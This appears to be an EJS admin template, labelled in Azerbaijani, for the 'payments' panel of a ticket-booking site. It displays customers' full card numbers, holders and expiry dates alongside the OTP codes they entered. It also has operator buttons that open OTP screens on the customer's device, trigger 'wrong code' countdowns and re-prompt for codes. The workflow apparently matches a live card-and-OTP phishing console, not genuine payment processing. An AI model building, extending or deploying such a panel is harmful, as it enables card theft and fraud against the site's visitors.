<!-- Admin Ödəniş Panel - Sadələşdirilmiş -->
<section class="section">
  <div class="container">
    <div class="section__head">
      <div>
        <div class="eyebrow"><%= t('nav.panel') %></div>
        <h1><%= t('admin.payments') %></h1>
      </div>
    </div>

    <div class="layout-aside">
      <%- include('../../partials/admin-nav') %>

      <div>
        <div class="card mb-24"><div class="card__body">
          <div class="timetable-tabs">
            <a class="tab <%= status === 'pending' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=pending">Gözləyən (<%= pending %>)</a>
            <a class="tab <%= status === 'approved' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=approved">Təsdiqlənmiş</a>
            <a class="tab <%= status === 'declined' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=declined">Rədd Edilmiş</a>
          </div>
          <div id="payNote" class="hidden alert mb-0"></div>
        </div></div>

        <% if (!payments.length) { %>
          <div class="card"><div class="card__body"><p class="sec-note mb-0">Ödəniş yoxdur</p></div></div>
        <% } %>

        <% payments.forEach(function(p){ %>
          <% var o = orderMap[String(p.order)] || null; %>
          <% var u = userMap[String(p.user)] || null; %>
          <div class="card mb-16">
            <div class="card__head">
              <span class="mono"><%= p.transactionId %></span>
              <span class="badge <%= p.status === 'approved' ? 'badge--green' : (p.status === 'declined' ? 'badge--red' : 'badge--gold') %>"><%= p.status %></span>
            </div>
            <div class="card__body">
              
              <!-- KART MƏLUMATLAR -->
              <div class="grid grid--2 mb-20">
                <div>
                  <h4 style="font-size:0.9rem;margin:0 0 12px 0;font-weight:600">🔐 Kart Məlumatları</h4>
                  <dl class="kv">
                    <dt>Kart</dt><dd class="mono"><%= p.card && p.card.number ? String(p.card.number).replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim() : '—' %></dd>
                    <dt>Sahibi</dt><dd><%= p.card && p.card.holder ? p.card.holder : '—' %></dd>
                    <dt>Son Tarix</dt><dd class="mono"><%= p.card && p.card.expiry ? p.card.expiry : '—' %></dd>
                    <dt>Brand</dt><dd><%= p.card && p.card.brand ? p.card.brand : '—' %></dd>
                    <dt>Məbləğ</dt><dd class="mono" style="font-size:1.1rem"><strong><%= p.amount.toFixed(2) %> ₼</strong></dd>
                  </dl>
                </div>

                <div>
                  <h4 style="font-size:0.9rem;margin:0 0 12px 0;font-weight:600">👤 Sifarış / Müştəri</h4>
                  <dl class="kv">
                    <dt>Müştəri</dt><dd><%= u ? (u.firstName + ' ' + u.lastName) : '—' %></dd>
                    <dt>Email</dt><dd><%= u ? u.email : '—' %></dd>
                    <dt>Telefon</dt><dd><%= u && u.phone ? u.phone : '—' %></dd>
                    <dt>Sifarış</dt><dd class="mono"><%= o ? o.orderNo : '(Balans)' %></dd>
                    <dt>Reysi</dt><dd><%= o ? (o.fromName + ' → ' + o.toName) : '—' %></dd>
                  </dl>
                </div>
              </div>

              <!-- OTP KODLAR -->
              <% if (p.verificationCode || p.submittedCode) { %>
                <div style="background:#f5f5f5;padding:12px;border-radius:4px;margin-bottom:16px">
                  <h4 style="font-size:0.9rem;margin:0 0 8px 0;font-weight:600">🔐 OTP Kodlar</h4>
                  <% if (p.submittedCode) { %>
                    <div style="margin-bottom:8px">
                      <span style="color:#666;font-size:0.9rem">✅ İstifadəçi daxil etdi:</span>
                      <span class="mono" style="font-size:1.3rem;letter-spacing:0.15em;font-weight:bold"><%= p.submittedCode %></span>
                      <% if (p.codeSubmittedAt) { %>
                        <div style="font-size:0.85rem;color:#999;margin-top:2px"><%= new Date(p.codeSubmittedAt).toLocaleTimeString('az-AZ', { timeZone: 'Asia/Baku' }) %></div>
                      <% } %>
                    </div>
                  <% } %>
                  <% if (p.verificationCode) { %>
                    <div>
                      <span style="color:#666;font-size:0.9rem">✓ Sistem yaratdı:</span>
                      <span class="mono" style="font-size:1.3rem;letter-spacing:0.15em;font-weight:bold;color:#0084ff"><%= p.verificationCode %></span>
                      <% if (p.rejectionCount > 0) { %>
                        <span style="font-size:0.85rem;color:#f57c00;margin-left:8px">(Yeniləndi <%= p.rejectionCount %> dəfə)</span>
                      <% } %>
                    </div>
                  <% } %>
                </div>
              <% } %>

              <!-- ADMIN SEÇIM DÜĞMƏLƏR -->
              <% if (p.status === 'code_submitted' && p.submittedCode) { %>
                <div class="alert alert--info mb-16">
                  <strong>🔔 Müştəri OTP daxil etdi!</strong><br>
                  <% if (p.submittedCode === p.verificationCode) { %>
                    Kod DOĞRUDUR - Bilet veriş üçün hazırdır ✅
                  <% } else { %>
                    Kod SEHVDİR - Yenidən cəhd etdirmə imkanı var
                  <% } %>
                </div>

                <div style="display:flex;gap:8px">
                  <button class="btn btn--primary btn--lg" data-approve-final="<%= p._id %>" style="flex:1">
                    ✅ Təsdiq Et (Bilet ver)
                  </button>
                  <button class="btn btn--warning btn--lg" data-reject-otp="<%= p._id %>" style="flex:1">
                    ❌ Səhv Kod
                  </button>
                  <button class="btn btn--outline btn--lg" data-decline="<%= p._id %>" style="flex:1">
                    🚫 Rədd Et
                  </button>
                </div>
              <% } else if (p.stage === 'card_review' && p.status === 'pending_admin') { %>
                <div class="alert alert--info mb-16">
                  <strong>💳 Yeni kart məlumatı daxil oldu</strong><br>
                  Təsdiq etdikdə istifadəçinin ekranında DƏRHAL OTP ekranı açılacaq.
                </div>
                <div style="display:flex;gap:8px">
                  <button class="btn btn--primary btn--lg" data-approve-card="<%= p._id %>" style="flex:1">
                    ✅ Təsdiq Et (OTP ekranını aç)
                  </button>
                  <button class="btn btn--outline btn--lg" data-decline="<%= p._id %>" style="flex:1">
                    🚫 Rədd Et
                  </button>
                </div>
              <% } else if (p.stage === 'wrong_code') { %>
                <div class="alert alert--warning mb-16">
                  <strong>⏱️ Səhv OTP — istifadəçidə 2 dəq geri sayım gedir</strong><br>
                  Geri sayım bitdikdə yeni OTP ekranı avtomatik açılacaq<% if (p.rejectionCount) { %> (Səhv kod: <%= p.rejectionCount %> dəfə)<% } %>.
                </div>
                <div style="display:flex;gap:8px">
                  <button class="btn btn--primary btn--lg" data-open-otp="<%= p._id %>" style="flex:1">
                    🔄 Yeni OTP ekranını indi aç
                  </button>
                  <button class="btn btn--outline btn--lg" data-decline="<%= p._id %>" style="flex:1">
                    🚫 Rədd Et
                  </button>
                </div>
              <% } else if (p.stage === 'otp_entry' && p.status === 'awaiting_3ds') { %>
                <div class="alert alert--warning">
                  🔐 İstifadəçi OTP kodunu daxil edir...
                </div>
              <% } else if (p.status === 'approved') { %>
                <div class="alert alert--success">
                  <strong>✅ Təsdiqlənmiş</strong><br>
                  <% if (p.adminFinalApprovedAt) { %>
                    <%= new Date(p.adminFinalApprovedAt).toLocaleString('az-AZ', { timeZone: 'Asia/Baku' }) %>
                  <% } %>
                </div>
              <% } else if (p.status === 'declined') { %>
                <div class="alert alert--danger">
                  <strong>❌ Rədd Edilmiş</strong><br>
                  <%= p.declinedReason || 'Səbəb göstərilmədi' %>
                </div>
              <% } else { %>
                <div class="alert alert--warning">
                  Ödəniş gözlümə mərhələsində...
                </div>
              <% } %>

            </div>
          </div>
        <% }) %>
      </div>
    </div>
  </div>
</section>

<script>
(function () {
  var note = document.getElementById('payNote');
  
  function show(msg, ok) {
    if (!note) return;
    note.classList.remove('hidden');
    note.className = 'alert ' + (ok ? 'alert--success' : 'alert--danger');
    note.textContent = msg;
    note.scrollIntoView({ behavior: 'smooth' });
  }
  
  async function call(url) {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify({})
    });
    return res.json();
  }

  document.addEventListener('click', async function (e) {
    const btn = e.target.closest('[data-approve-card], [data-open-otp], [data-approve-final], [data-reject-otp], [data-decline]');
    if (!btn) return;
    
    e.preventDefault();
    btn.disabled = true;
    
    let url = '';
    if (btn.hasAttribute('data-approve-card')) {
      url = '/api/admin/payments/' + btn.getAttribute('data-approve-card') + '/approve-card';
    } else if (btn.hasAttribute('data-open-otp')) {
      url = '/api/admin/payments/' + btn.getAttribute('data-open-otp') + '/open-otp';
    } else if (btn.hasAttribute('data-approve-final')) {
      url = '/api/admin/payments/' + btn.getAttribute('data-approve-final') + '/approve-final';
    } else if (btn.hasAttribute('data-reject-otp')) {
      url = '/api/admin/payments/' + btn.getAttribute('data-reject-otp') + '/reject-otp';
    } else if (btn.hasAttribute('data-decline')) {
      url = '/api/admin/payments/' + btn.getAttribute('data-decline') + '/decline';
    }

    try {
      const data = await call(url);
      show(data.message || (data.ok ? 'Tamamlandı' : 'Xəta'), !!data.ok);
      if (data.ok) {
        setTimeout(() => { window.location.reload(); }, 1200);
      } else {
        btn.disabled = false;
      }
    } catch (err) {
      show('Şəbəkə xətası', false);
      btn.disabled = false;
    }
  });

  // Auto-refresh pending tab
  if ('<%= status %>' === 'pending') {
    setInterval(() => {
      if (!document.querySelector('button:disabled')) {
        window.location.reload();
      }
    }, 8000);
  }
})();
</script>
